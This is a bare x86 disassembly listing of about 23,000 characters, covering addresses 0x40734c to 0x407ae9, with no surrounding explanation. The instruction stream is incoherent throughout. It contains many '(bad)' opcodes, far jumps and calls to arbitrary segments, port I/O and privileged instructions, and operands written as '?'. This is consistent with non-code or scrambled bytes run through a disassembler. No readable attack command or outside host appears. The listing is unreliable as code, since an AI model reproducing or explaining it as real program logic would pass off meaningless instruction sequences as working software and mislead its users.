  40734c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40734d:	call   0x7839:0x42728ee2
  407354:	xchg   ebx,eax
  407355:	mov    cl,0x40
  407357:	fadd   st,st(1)
  407359:	es stos DWORD PTR es:[edi],eax
  40735b:	test   al,0x1d
  40735d:	not    bh
  40735f:	mov    bh,0x2b
  407361:	ins    BYTE PTR es:[edi],dx
  407362:	int    0xd6
  407364:	test   BYTE PTR [esi],bh
  407366:	mov    edx,0xdec901f4
  40736b:	xchg   esp,eax
  40736c:	mov    edx,0x435a11e8
  407371:	imul   ebx,ebp,0xffffffdb
  407374:	sub    al,0x3f
  407376:	xchg   esp,eax
  407377:	in     eax,dx
  407378:	jmp    0x40738a
  40737a:	cmp    ch,cl
  40737c:	popa   
  40737d:	adc    bl,BYTE PTR [ebx-0x18c27249]
  407383:	fisttp QWORD PTR [edx]
  407385:	lahf   
  407386:	fidivr DWORD PTR [esi]
  407388:	ins    DWORD PTR es:[edi],dx
  407389:	retf   0xbc83
  40738c:	in     al,0x24
  40738e:	push   0xffffff8a
  407390:	test   al,0xb2
  407392:	scas   al,BYTE PTR es:[edi]
  407393:	xor    BYTE PTR [ebx],bh
  407395:	mov    ds:0xf03df585,eax
  40739a:	adc    ch,cl
  40739c:	jmp    0x747:0x9f8cff43
  4073a3:	xchg   ebx,eax
  4073a4:	arpl   bp,ax
  4073a6:	push   ebp
  4073a7:	test   ebp,ecx
  4073a9:	test   BYTE PTR [eax-0x1fe7b45a],0x85
  4073b0:	cwde   
  4073b1:	mov    ds:0x9965965a,al
  4073b6:	fwait
  4073b7:	push   esp
  4073b8:	clc    
  4073b9:	aaa    
  4073ba:	jnp    0x407406
  4073bc:	ret    
  4073bd:	dec    ecx
  4073be:	stos   BYTE PTR es:[edi],al
  4073bf:	nop
  4073c0:	jns    0x4073a9
  4073c2:	out    0x68,al
  4073c4:	(bad)  
  4073c5:	mov    edi,DWORD PTR [esi]
  4073c7:	shl    edi,cl
  4073c9:	aas    
  4073ca:	inc    edx
  4073cb:	mov    BYTE PTR [ebx-0x76f3395e],cl
  4073d1:	inc    ebp
  4073d2:	mov    esp,0x85d7600d
  4073d7:	and    eax,0x76f6cb08
  4073dc:	mov    ds:0x866d0132,eax
  4073e1:	adc    BYTE PTR [edi],ch
  4073e3:	arpl   dx,ax
  4073e5:	and    dl,BYTE PTR [esi]
  4073e7:	push   ss
  4073e8:	dec    ecx
  4073e9:	popa   
  4073ea:	out    dx,al
  4073eb:	jmp    0x824c:0xf7f2ebee
  4073f2:	or     edx,eax
  4073f4:	or     BYTE PTR [edi],dl
  4073f6:	shl    BYTE PTR [eax],1
  4073f8:	daa    
  4073f9:	xor    al,BYTE PTR [esi-0x430c7634]
  4073ff:	in     eax,0x5a
  407401:	xchg   BYTE PTR [edi+0x5b],al
  407404:	xor    BYTE PTR [edx+0x1a],ch
  407407:	ret    
  407408:	test   BYTE PTR [edi+0x11a4b341],dh
  40740e:	dec    esp
  40740f:	cmp    DWORD PTR [ecx+0x15],ebx
  407412:	inc    esi
  407413:	rcl    BYTE PTR [edx+0xd1c056c],1
  407419:	aad    0x32
  40741b:	mov    esp,?
  40741d:	pusha  
  40741e:	mov    ecx,0xb0156c2e
  407423:	jbe    0x407460
  407425:	call   0x6f3df017
  40742a:	into   
  40742b:	sub    edi,DWORD PTR [edi+0x5a10ef2b]
  407431:	out    dx,al
  407432:	sbb    DWORD PTR [edi-0x5],0xffffffe1
  407436:	jmp    0xd06c:0x271e152c
  40743d:	adc    ch,BYTE PTR [esp+ecx*1-0x48]
  407441:	test   eax,0xda6ce740
  407446:	jecxz  0x4073e7
  407448:	rcl    BYTE PTR [ebx-0x6],0x97
  40744c:	push   esp
  40744d:	mov    al,ds:0xf3376769
  407452:	adc    ecx,edx
  407454:	inc    ecx
  407455:	lods   eax,DWORD PTR ds:[esi]
  407456:	add    BYTE PTR [ebp+0x76],0xba
  40745a:	or     ebp,eax
  40745c:	dec    ebp
  40745d:	add    ebp,DWORD PTR [esi]
  40745f:	div    BYTE PTR ds:0x870dd8f
  407465:	pop    edi
  407466:	pop    esp
  407467:	xchg   esp,eax
  407468:	fwait
  407469:	xchg   ebx,eax
  40746a:	cs add eax,0x543d005b
  407470:	dec    esp
  407471:	push   ebx
  407472:	cmc    
  407473:	lods   eax,DWORD PTR ss:[esi]
  407475:	push   ebx
  407476:	xrelease mov DWORD PTR [edi+0x4a],ebp
  40747a:	add    al,BYTE PTR [esi+eiz*2-0xd]
  40747e:	dec    eax
  40747f:	mov    eax,0x3c237f4f
  407484:	push   esp
  407485:	push   ss
  407486:	fiadd  DWORD PTR [edi-0x682ce166]
  40748c:	mov    ebx,0x68ef672b
  407491:	jp     0x40744b
  407493:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407494:	mov    ds:0xcedec84e,eax
  407499:	adc    ebx,DWORD PTR [eax-0x3e0b623c]
  40749f:	outs   dx,DWORD PTR ds:[esi]
  4074a0:	adc    al,0xe3
  4074a2:	inc    ebp
  4074a3:	add    eax,0x159f3446
  4074a8:	jmp    0xbf40:0x748130ce
  4074af:	sbb    cl,dh
  4074b1:	sar    BYTE PTR [eax+ebp*1],0xf2
  4074b5:	leave  
  4074b6:	imul   edi,ebp,0xffffffc6
  4074b9:	sub    BYTE PTR [ecx-0x68fa9845],ch
  4074bf:	pop    es
  4074c0:	psubq  mm0,QWORD PTR [edx]
  4074c3:	enter  0x5e75,0x52
  4074c7:	and    esi,esp
  4074c9:	ret    0x4efa
  4074cc:	(bad)  
  4074cd:	fstp   DWORD PTR [ecx+ebx*1]
  4074d0:	jle    0x407510
  4074d2:	call   0xc8811325
  4074d7:	ins    DWORD PTR es:[edi],dx
  4074d8:	and    DWORD PTR [ebx-0x4],edi
  4074db:	adc    esp,DWORD PTR [esi+0xf8a71b7]
  4074e1:	adc    BYTE PTR [esi],cl
  4074e3:	or     edx,esi
  4074e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074e6:	jp     0x407500
  4074e8:	retf   
  4074e9:	sub    BYTE PTR [edx+0x22193522],ch
  4074ef:	es xchg edx,eax
  4074f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074f2:	adc    al,BYTE PTR [edi+eax*1]
  4074f5:	ins    BYTE PTR es:[edi],dx
  4074f6:	fdiv   DWORD PTR ds:0x1658e666
  4074fc:	inc    edi
  4074fd:	push   edi
  4074fe:	arpl   WORD PTR [ebx+edi*8],cx
  407501:	fwait
  407502:	daa    
  407503:	into   
  407504:	cdq    
  407505:	not    BYTE PTR [ebp-0x3375e3f3]
  40750b:	inc    ebp
  40750c:	sub    BYTE PTR [ebx+0x651ea34d],ah
  407512:	xor    al,BYTE PTR [ebp-0x4a]
  407515:	in     al,0x13
  407517:	mov    ebp,0x2e43daea
  40751c:	aad    0x61
  40751e:	xchg   BYTE PTR [esi-0x1434dc51],cl
  407524:	fisubr WORD PTR [ebx]
  407526:	cmp    al,0xf2
  407528:	retf   0x70a5
  40752b:	enter  0xb3be,0x63
  40752f:	gs iret 
  407531:	fnstcw WORD PTR [ecx-0x7]
  407534:	(bad)  
  407535:	imul   edx,DWORD PTR [ebp-0x4cb9610],0x13
  40753c:	test   al,0x6c
  40753e:	imul   ebp,DWORD PTR [ebx+0x4e282dd0],0xfffffff6
  407545:	retf   
  407546:	dec    ebx
  407547:	push   0xffffff93
  407549:	ds and eax,0x40ae6899
  40754f:	jmp    0xa9d1af0b
  407554:	fwait
  407555:	popf   
  407556:	jae    0x4075a1
  407558:	mov    ebx,0x46e18c5a
  40755d:	inc    esp
  40755e:	push   ebp
  40755f:	lahf   
  407560:	xchg   edx,eax
  407561:	jle    0x4074f1
  407563:	sbb    BYTE PTR [ebx+0x564abd09],0x57
  40756a:	lds    edx,FWORD PTR es:[edi+ebx*8+0x341e76dc]
  407572:	add    eax,DWORD PTR [edx+0x5a]
  407575:	lahf   
  407576:	mov    edx,0x61cd09d6
  40757b:	xchg   ecx,eax
  40757c:	repz adc eax,0xb36f621e
  407582:	mov    al,0xd0
  407584:	fwait
  407585:	push   ebx
  407586:	call   0xd915:0xc394dbfb
  40758d:	shl    BYTE PTR [ebp-0x2a],cl
  407590:	out    dx,eax
  407591:	lods   al,BYTE PTR ds:[esi]
  407592:	pop    ecx
  407593:	jmp    0x536f6233
  407598:	push   0x29
  40759a:	arpl   WORD PTR [edx],ax
  40759c:	jo     0x4075c8
  40759e:	push   ecx
  40759f:	push   ebx
  4075a0:	cmp    bl,BYTE PTR [edi-0x3d]
  4075a3:	stos   DWORD PTR es:[edi],eax
  4075a4:	sbb    al,0x5a
  4075a6:	mov    ebp,DWORD PTR [edx]
  4075a8:	add    al,0x2c
  4075aa:	mov    ah,0x90
  4075ac:	sub    al,0x8c
  4075ae:	bound  edx,QWORD PTR [ecx]
  4075b0:	cmp    bl,BYTE PTR [ecx-0x4b87bda2]
  4075b6:	fnstenv [ecx]
  4075b8:	retf   0xd012
  4075bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075bc:	adc    eax,0x6e97451e
  4075c1:	push   ss
  4075c2:	or     al,0xd9
  4075c4:	and    ah,dh
  4075c6:	stos   DWORD PTR es:[edi],eax
  4075c7:	arpl   WORD PTR [esp+ebx*1-0x4527d25d],ax
  4075ce:	loope  0x4075b4
  4075d0:	xchg   BYTE PTR [eax],dh
  4075d2:	pop    eax
  4075d3:	push   DWORD PTR [ebx+0x2d3e6eed]
  4075d9:	xor    dl,bh
  4075db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075dc:	cmp    al,0xf5
  4075de:	add    al,0xd3
  4075e0:	add    ah,BYTE PTR [eax]
  4075e2:	cmp    esp,edx
  4075e4:	push   ebx
  4075e5:	adc    ebx,DWORD PTR gs:[eax+0x5c]
  4075e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075ea:	rcr    ch,cl
  4075ec:	inc    eax
  4075ed:	cmp    al,0xc4
  4075ef:	pop    esi
  4075f0:	pop    ebp
  4075f1:	cmc    
  4075f2:	adc    eax,0xcccaa8
  4075f7:	mov    WORD PTR [edx],gs
  4075f9:	xchg   esi,eax
  4075fa:	jle    0x407629
  4075fc:	scas   eax,DWORD PTR es:[edi]
  4075fd:	outs   dx,DWORD PTR ds:[esi]
  4075fe:	shl    cl,0x95
  407601:	std    
  407602:	mov    al,0xe1
  407604:	xlat   BYTE PTR ds:[ebx]
  407605:	aas    
  407606:	(bad)  
  407607:	js     0x40761e
  407609:	mov    ecx,0x8f971e5
  40760e:	jbe    0x4075b4
  407610:	or     BYTE PTR [edi],bl
  407612:	(bad)  
  407613:	adc    al,0x7f
  407615:	frstorw gs:[ebx+0x6f]
  40761a:	test   ecx,edx
  40761c:	ins    BYTE PTR es:[edi],dx
  40761d:	mov    edx,0xc6a3864a
  407622:	call   0x9496f070
  407627:	xor    BYTE PTR [edi],dh
  407629:	fcomp  QWORD PTR [edx]
  40762b:	jmp    0x78de:0x5078db20
  407632:	scas   eax,DWORD PTR es:[edi]
  407633:	push   0xffffff98
  407635:	sbb    al,ah
  407637:	xlat   BYTE PTR ds:[ebx]
  407638:	jecxz  0x4075e7
  40763a:	xchg   ebp,eax
  40763b:	mov    bh,0xc9
  40763d:	bound  esp,QWORD PTR [eax-0x562594a2]
  407643:	mov    edi,0x51693b6c
  407648:	dec    edi
  407649:	xchg   edi,eax
  40764a:	arpl   WORD PTR [ecx],di
  40764c:	into   
  40764d:	loope  0x407652
  40764f:	cmp    ah,al
  407651:	gs pop esi
  407653:	mov    ds,WORD PTR [ebp+0x16]
  407656:	jecxz  0x407603
  407658:	xchg   ebp,eax
  407659:	cmp    al,0x6e
  40765b:	inc    esp
  40765c:	or     ecx,esp
  40765e:	push   0xbbc11b97
  407663:	adc    BYTE PTR [edi],0x69
  407666:	aad    0x3a
  407668:	xlat   BYTE PTR ds:[ebx]
  407669:	inc    esi
  40766a:	sar    BYTE PTR [ecx],cl
  40766c:	pop    ds
  40766d:	jnp    0x4076df
  40766f:	dec    ebx
  407670:	pusha  
  407671:	ret    0xd1dc
  407674:	xlat   BYTE PTR ds:[ebx]
  407675:	in     eax,0xc8
  407677:	sbb    BYTE PTR [ecx-0x76],bh
  40767a:	dec    eax
  40767b:	in     al,0xd9
  40767d:	or     ebx,DWORD PTR [eax-0x7000ad65]
  407683:	jnp    0x407635
  407685:	bound  edx,QWORD PTR [ebx-0x65]
  407688:	(bad)  
  407689:	cmp    al,BYTE PTR [esi-0x31def6a6]
  40768f:	mul    DWORD PTR [esi-0x44]
  407692:	pop    edi
  407693:	xchg   ecx,eax
  407694:	int    0x70
  407696:	test   DWORD PTR [esp+ebx*4-0x5c92ef27],esp
  40769d:	call   0x80e7bd2e
  4076a2:	pop    ebp
  4076a3:	retf   0xe7ba
  4076a6:	bound  edi,QWORD PTR [edx+0x295d8b61]
  4076ac:	or     eax,0xd91cea04
  4076b1:	jl     0x407681
  4076b3:	xchg   edi,eax
  4076b4:	xlat   BYTE PTR ds:[ebx]
  4076b5:	popa   
  4076b6:	sahf   
  4076b7:	sbb    eax,0xfffffff0
  4076ba:	xor    eax,edi
  4076bc:	or     edi,DWORD PTR [ebx]
  4076be:	push   esi
  4076bf:	push   ds
  4076c0:	addr16 or al,0x48
  4076c3:	jmp    0x40772c
  4076c5:	add    bh,ch
  4076c7:	add    DWORD PTR [esi+0x5b],eax
  4076ca:	div    DWORD PTR [ebx+0x4c4f9e9e]
  4076d0:	outs   dx,DWORD PTR ds:[esi]
  4076d1:	mov    ah,0xda
  4076d3:	jnp    0x4076b7
  4076d5:	or     al,0x1c
  4076d7:	in     eax,dx
  4076d8:	je     0x4076ae
  4076da:	jl     0x4076f5
  4076dc:	cs mov bl,0xb9
  4076df:	rol    ah,cl
  4076e1:	mov    edi,DWORD PTR [edi+esi*1+0x75]
  4076e5:	cdq    
  4076e6:	fisttp QWORD PTR [esp+ebx*8-0x191ae9c9]
  4076ed:	jg     0x4076a3
  4076ef:	pop    es
  4076f0:	fsubr  QWORD PTR [ecx+0x6b]
  4076f3:	push   cs
  4076f4:	xchg   ebx,eax
  4076f5:	push   0xffffffee
  4076f7:	retf   0x714
  4076fa:	xchg   DWORD PTR ds:0x5ddd5aed,esp
  407700:	retf   
  407701:	adc    edx,DWORD PTR [ecx+0x6e]
  407704:	fucomp st(7)
  407706:	jle    0x40768c
  407708:	or     eax,0xcdfd2bcb
  40770d:	cld    
  40770e:	int3   
  40770f:	xchg   esp,eax
  407710:	paddq  mm7,QWORD PTR [esi]
  407713:	pop    ds
  407714:	ja     0x407768
  407716:	int3   
  407717:	ret    0x157f
  40771a:	dec    edi
  40771b:	xor    dl,BYTE PTR [edx+0x45]
  40771e:	xchg   BYTE PTR [eax-0x8],bl
  407721:	or     eax,0xebeb910b
  407726:	jns    0x407773
  407728:	mov    edx,0x44e870cb
  40772d:	cli    
  40772e:	add    BYTE PTR [ebp+0x78],al
  407731:	retf   
  407732:	and    edi,DWORD PTR [ecx+0x67]
  407735:	sub    BYTE PTR [edx+0x3188162b],0x84
  40773c:	xchg   bl,ch
  40773e:	(bad)  
  40773f:	jmp    0x4f40:0x96a14d77
  407746:	xor    BYTE PTR gs:[eax+0x12],0x2a
  40774b:	test   al,0x5a
  40774d:	pushf  
  40774e:	div    DWORD PTR [ecx]
  407750:	inc    edx
  407751:	mov    ebx,0x1bf3dd8e
  407756:	(bad)  
  407757:	aad    0x1b
  407759:	mov    ds:0xd93925d5,al
  40775e:	gs cwde 
  407760:	cli    
  407761:	stc    
  407762:	push   ds
  407763:	pop    ecx
  407764:	push   0x95ffa7cf
  407769:	adc    ebx,DWORD PTR [ecx+0x61]
  40776c:	jbe    0x407732
  40776e:	(bad)  [eax+0x7b603528]
  407774:	push   ss
  407775:	inc    ecx
  407776:	sbb    bl,ch
  407778:	das    
  407779:	xor    dh,ch
  40777b:	shr    DWORD PTR [esi],cl
  40777d:	mov    al,0xfd
  40777f:	dec    edx
  407780:	lods   eax,DWORD PTR ds:[esi]
  407781:	nop
  407782:	inc    esp
  407783:	mov    ebx,0x4c1c4701
  407788:	dec    ebx
  407789:	sub    ecx,ebx
  40778b:	sbb    BYTE PTR [ecx],ah
  40778d:	(bad)  
  40778e:	jg     0x40778c
  407790:	ins    DWORD PTR es:[edi],dx
  407791:	sbb    DWORD PTR [edx-0x75df7b0d],edi
  407797:	xchg   esi,eax
  407798:	or     ebp,DWORD PTR [edi]
  40779a:	mov    bl,0x73
  40779c:	and    DWORD PTR [esi+0x2b],edi
  40779f:	call   0xd355:0x68c0ce71
  4077a6:	fadd   DWORD PTR cs:[edx]
  4077a9:	in     eax,0xe8
  4077ab:	pop    ss
  4077ac:	lods   eax,DWORD PTR ds:[esi]
  4077ad:	inc    ebx
  4077ae:	xor    cl,BYTE PTR [esi]
  4077b0:	dec    edi
  4077b1:	cmp    bl,BYTE PTR [edx+0x75]
  4077b4:	mov    edi,0xcd13c3bd
  4077b9:	or     bl,bh
  4077bb:	rcr    BYTE PTR [edi],1
  4077bd:	ins    BYTE PTR es:[edi],dx
  4077be:	jle    0x407801
  4077c0:	mov    edi,0x630c1caf
  4077c5:	pop    esp
  4077c6:	push   cs
  4077c7:	pop    ecx
  4077c8:	dec    ebp
  4077c9:	out    dx,eax
  4077ca:	cmp    BYTE PTR [esi],dh
  4077cc:	cmc    
  4077cd:	dec    ebp
  4077ce:	sub    eax,0xebe807d2
  4077d3:	lock push esi
  4077d5:	inc    eax
  4077d6:	mov    ah,0x4b
  4077d8:	push   edi
  4077d9:	lahf   
  4077da:	stos   DWORD PTR es:[edi],eax
  4077db:	sbb    eax,0xf5fecd22
  4077e0:	mov    WORD PTR [esi+0x1e9d66fe],?
  4077e6:	stos   BYTE PTR es:[edi],al
  4077e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077e8:	cdq    
  4077e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4077ea:	retf   
  4077eb:	stc    
  4077ec:	and    eax,0x315a003a
  4077f1:	out    0x61,al
  4077f3:	test   eax,edi
  4077f5:	dec    ecx
  4077f6:	xor    eax,0xf7fb774e
  4077fb:	sahf   
  4077fc:	ret    0xa05
  4077ff:	popf   
  407800:	repnz mov ah,0x26
  407804:	aaa    
  407805:	mul    cl
  407807:	shl    BYTE PTR [edi+0x2d],0x80
  40780b:	and    BYTE PTR [esi],0xff
  40780e:	ds gs xchg edx,eax
  407811:	test   DWORD PTR [ecx+0x70],0xb1a785e5
  407818:	fst    DWORD PTR [esi+0x3d]
  40781b:	sbb    DWORD PTR [edi+esi*2],eax
  40781e:	xchg   esp,eax
  40781f:	xchg   edi,eax
  407820:	sbb    esi,esp
  407822:	push   cs
  407823:	outs   dx,DWORD PTR ds:[esi]
  407824:	mov    DWORD PTR [esp+ebx*2],eax
  407827:	push   edx
  407828:	out    0xcf,al
  40782a:	mov    dh,0x8d
  40782c:	loopne 0x4077b8
  40782e:	cmp    DWORD PTR [ebp-0x34],ebp
  407831:	inc    ecx
  407832:	xchg   ecx,eax
  407833:	mov    ?,WORD PTR [ebx+0x1c]
  407836:	fisubr DWORD PTR [ebx+0xa59f025]
  40783c:	in     eax,0x34
  40783e:	push   ss
  40783f:	push   eax
  407840:	rol    ecx,1
  407842:	mov    esp,DWORD PTR [eax+0x4f118f46]
  407848:	iret   
  407849:	push   es
  40784a:	xchg   dh,ch
  40784c:	js     0x407838
  40784e:	mov    edx,DWORD PTR [ebp+0x71]
  407851:	and    ecx,DWORD PTR ds:0xab9a08d6
  407857:	inc    edx
  407858:	outs   dx,DWORD PTR ds:[esi]
  407859:	push   edi
  40785a:	xchg   DWORD PTR [eax-0x80],esp
  40785d:	aaa    
  40785e:	xor    eax,0xc8eb8aca
  407863:	sbb    al,0x80
  407865:	sub    eax,0x1d5b4991
  40786a:	loope  0x407817
  40786c:	pop    esp
  40786d:	jl     0x4077fa
  40786f:	shl    BYTE PTR [eax],cl
  407871:	xchg   BYTE PTR [ecx-0x15899b],bh
  407877:	clc    
  407878:	sahf   
  407879:	inc    ebp
  40787a:	add    al,0xb
  40787c:	nop
  40787d:	retf   0xd0ff
  407880:	xlat   BYTE PTR ds:[ebx]
  407881:	js     0x4078b2
  407883:	ret    0xff0e
  407886:	in     eax,dx
  407887:	sub    al,0x0
  407889:	call   0xd117:0x814cc95f
  407890:	add    DWORD PTR [ebx+0x16],ecx
  407893:	sub    ecx,DWORD PTR [edi+0x5dcdd3ca]
  407899:	shr    DWORD PTR [ecx+edx*4],1
  40789c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40789d:	sub    BYTE PTR [edx+edi*1+0x16],dh
  4078a1:	fcmovnb st,st(1)
  4078a3:	pop    esi
  4078a4:	push   ds
  4078a5:	or     ebx,esp
  4078a7:	cmp    eax,0x2b2e5802
  4078ac:	cs mov ecx,0x49d70754
  4078b2:	fs inc esi
  4078b4:	or     BYTE PTR [ebx+0x7506d245],ah
  4078ba:	leave  
  4078bb:	retf   0xf9c
  4078be:	mov    dl,0xf1
  4078c0:	push   ebx
  4078c1:	xchg   esi,eax
  4078c2:	and    al,0x89
  4078c4:	pushf  
  4078c5:	aad    0x7b
  4078c7:	push   ecx
  4078c8:	cmp    al,0x89
  4078ca:	pop    eax
  4078cb:	dec    edx
  4078cc:	push   esi
  4078cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078ce:	int    0xc7
  4078d0:	dec    eax
  4078d1:	and    BYTE PTR [edi+0x6f741789],0xc2
  4078d8:	lea    ecx,[eax+0x4d]
  4078db:	int3   
  4078dc:	loop   0x4078ac
  4078de:	(bad)  
  4078df:	jp     0x40787b
  4078e1:	xchg   BYTE PTR [ebp+0x6a],bh
  4078e4:	cmp    al,BYTE PTR [edi*4+0x3a646374]
  4078eb:	mov    ch,0x29
  4078ed:	icebp  
  4078ee:	jl     0x407921
  4078f0:	dec    ecx
  4078f1:	repnz dec ecx
  4078f3:	ins    BYTE PTR es:[edi],dx
  4078f4:	rcl    DWORD PTR [eax+0x74],cl
  4078f7:	xlat   BYTE PTR ds:[ebx]
  4078f8:	adc    eax,0xc0493758
  4078fd:	or     BYTE PTR ds:0x31993dec,cl
  407903:	je     0x407912
  407905:	xor    ch,BYTE PTR [edi+0x41]
  407908:	mov    esi,0xd60be5ac
  40790d:	cdq    
  40790e:	mov    ds,WORD PTR [ebx+0x1ad26952]
  407914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407915:	cli    
  407916:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407917:	or     esp,DWORD PTR ds:0x84616a39
  40791d:	je     0x4078e3
  40791f:	hlt    
  407920:	pop    esp
  407921:	cmp    ecx,ebx
  407923:	mov    ds:0x54b799f6,eax
  407928:	xchg   BYTE PTR [ecx],bh
  40792a:	cli    
  40792b:	mov    ch,0xa6
  40792d:	mov    ebx,0xb98223ed
  407932:	sub    eax,0x5d28a10c
  407937:	retf   
  407938:	addr16 xchg ecx,eax
  40793a:	sbb    esi,DWORD PTR [ecx+0x7de54acc]
  407940:	icebp  
  407941:	dec    ebp
  407942:	scas   al,BYTE PTR es:[edi]
  407943:	push   ss
  407944:	fs or  al,0x38
  407947:	fnstsw WORD PTR [ebx+0x1d2bba9e]
  40794d:	dec    esi
  40794e:	dec    esi
  40794f:	test   eax,0xe223a8e7
  407954:	imul   ebp,DWORD PTR [ebp+0x18],0x1d666a22
  40795b:	(bad)  
  40795c:	xor    esi,ebp
  40795e:	mov    dh,0x92
  407960:	xchg   edx,eax
  407961:	(bad)
  407965:	scas   eax,DWORD PTR es:[edi]
  407966:	push   0xffffff8a
  407968:	or     ah,BYTE PTR [edx+0x9]
  40796b:	jle    0x4078ee
  40796d:	rol    BYTE PTR [eax-0x3f601e09],0x6c
  407974:	push   edx
  407975:	pop    esi
  407976:	test   esi,ebp
  407978:	inc    esi
  407979:	jmp    0xdf04772d
  40797e:	loope  0x407987
  407980:	pop    ss
  407981:	mov    ebx,0x9c1b97a1
  407986:	mov    ?,ebx
  407988:	ret    0x4963
  40798b:	gs iret 
  40798d:	mov    al,BYTE PTR [eax]
  40798f:	stc    
  407990:	jbe    0x407975
  407992:	(bad)  [esi-0x1f0d44cb]
  407998:	jge    0x407964
  40799a:	in     al,0xa9
  40799c:	mov    ch,0x4d
  40799e:	pop    ebp
  40799f:	sub    edi,esp
  4079a1:	repnz shl BYTE PTR [edx],cl
  4079a4:	lock mov cx,bp
  4079a8:	ficomp WORD PTR [ecx-0x7cf7d7bd]
  4079ae:	inc    ecx
  4079af:	nop
  4079b0:	rcl    DWORD PTR [ebx+0x20747b01],1
  4079b6:	pop    ss
  4079b7:	mov    ds:0x5dd3fd1e,eax
  4079bc:	mov    ah,0x5
  4079be:	fiadd  DWORD PTR [esi+0x43c6713a]
  4079c4:	fidivr DWORD PTR [ebp+0x56]
  4079c7:	outs   dx,DWORD PTR ds:[esi]
  4079c8:	in     al,dx
  4079c9:	fs xor ebp,ecx
  4079cc:	jae    0x407a00
  4079ce:	ret    
  4079cf:	cmp    al,0x24
  4079d1:	xlat   BYTE PTR ds:[ebx]
  4079d2:	dec    esp
  4079d3:	mov    al,0xc2
  4079d5:	fcomp  DWORD PTR [ebx]
  4079d7:	in     eax,0x23
  4079d9:	(bad)
  4079dd:	xchg   BYTE PTR [edi],bh
  4079df:	lahf   
  4079e0:	leave  
  4079e1:	sbb    ebx,DWORD PTR fs:[ecx-0x39885c88]
  4079e8:	add    DWORD PTR [edi+0x7f79beab],ecx
  4079ee:	sbb    bl,ah
  4079f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079f1:	js     0x407a0e
  4079f3:	mov    eax,0x6c2c05e2
  4079f8:	sub    eax,eax
  4079fa:	xor    DWORD PTR [edx+0x32],0xab9dd302
  407a01:	test   al,0x8d
  407a03:	xor    al,al
  407a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a06:	lds    ecx,FWORD PTR [esi-0x39]
  407a09:	add    esp,DWORD PTR [edi-0x5f]
  407a0c:	inc    esp
  407a0d:	jno    0x407a29
  407a0f:	mov    cl,0x63
  407a11:	push   0x13cb974
  407a16:	jbe    0x407a86
  407a18:	dec    eax
  407a19:	fisttp WORD PTR [esi]
  407a1b:	sub    ah,BYTE PTR [edi-0x2b]
  407a1e:	adc    DWORD PTR [edi+0x489f8947],eax
  407a24:	sub    eax,0x76c9719a
  407a29:	aad    0xe3
  407a2b:	dec    ecx
  407a2c:	ins    BYTE PTR es:[edi],dx
  407a2d:	out    dx,eax
  407a2e:	or     al,0x2
  407a30:	pop    ebx
  407a31:	jns    0x407a03
  407a33:	xchg   edx,eax
  407a34:	mov    bl,0x18
  407a36:	fidiv  WORD PTR [edi-0x263b7f24]
  407a3c:	mov    al,0xaf
  407a3e:	or     esp,DWORD PTR [ebp+0xc]
  407a41:	push   es
  407a42:	imul   ecx,DWORD PTR [eax],0xffffff8a
  407a45:	xchg   DWORD PTR [ebp+eiz*2-0x29f7b930],ebx
  407a4c:	ja     0x407a2f
  407a4e:	not    BYTE PTR [ebp-0x1e]
  407a51:	jne    0x4079d9
  407a53:	and    eax,0xb5cb6a52
  407a58:	stos   DWORD PTR es:[edi],eax
  407a59:	mov    al,bh
  407a5b:	aam    0xbf
  407a5d:	das    
  407a5e:	sti    
  407a5f:	or     DWORD PTR [ebp-0x4b651c04],ecx
  407a65:	mov    edx,fs
  407a67:	fadd   DWORD PTR [edx-0x1b]
  407a6a:	push   ds
  407a6b:	push   esi
  407a6c:	inc    edx
  407a6d:	push   cs
  407a6e:	pop    ds
  407a6f:	sti    
  407a70:	mov    ds:0xfc95711e,al
  407a75:	es push 0xb073ba3b
  407a7b:	dec    ebx
  407a7c:	dec    esi
  407a7d:	jnp    0x407ae2
  407a7f:	lods   al,BYTE PTR ds:[esi]
  407a80:	sbb    edx,DWORD PTR [ebx+0x2a]
  407a83:	loope  0x407a1e
  407a85:	mov    ch,0xab
  407a87:	jmp    0x35b6:0xd502d1b3
  407a8e:	sar    DWORD PTR [eax+0x14cba6d],cl
  407a94:	popf   
  407a95:	pushf  
  407a96:	pusha  
  407a97:	rol    BYTE PTR [edi],0x66
  407a9a:	inc    ebx
  407a9b:	mov    al,0x2c
  407a9d:	cdq    
  407a9e:	pop    edx
  407a9f:	in     al,dx
  407aa0:	xchg   esp,eax
  407aa1:	sbb    DWORD PTR [esi+eiz*1],ebp
  407aa4:	jbe    0x407b0f
  407aa6:	jecxz  0x407a53
  407aa8:	(bad)  
  407aa9:	sub    DWORD PTR [edx],ecx
  407aab:	cmc    
  407aac:	mov    WORD PTR [ebx+0x1d],ss
  407aaf:	data16 stc 
  407ab1:	mov    DWORD PTR [edi+0x15],esp
  407ab4:	cmp    BYTE PTR [esi+0x3],0xa6
  407ab8:	push   0x4b
  407aba:	pop    ds
  407abb:	in     eax,0x93
  407abd:	mov    al,ds:0x97025ab1
  407ac2:	shr    al,1
  407ac4:	fidivr WORD PTR [ebx+0x4fb66373]
  407aca:	stc    
  407acb:	xchg   edx,eax
  407acc:	sbb    DWORD PTR [edx-0x202d8d75],esi
  407ad2:	gs clc 
  407ad4:	dec    ebp
  407ad5:	jb     0x407a86
  407ad7:	sub    esp,DWORD PTR [eax+edi*2+0x24]
  407adb:	dec    ecx
  407adc:	xchg   edx,eax
  407add:	scas   eax,DWORD PTR es:[edi]
  407ade:	xchg   edi,eax
  407adf:	in     al,0x63
  407ae1:	loop   0x407ae4
  407ae3:	jns    0x407b3d
  407ae5:	arpl   di,ax
  407ae7:	nop
  407ae8:	xchg   edx,eax
  407ae9:	loop   0x407a9c
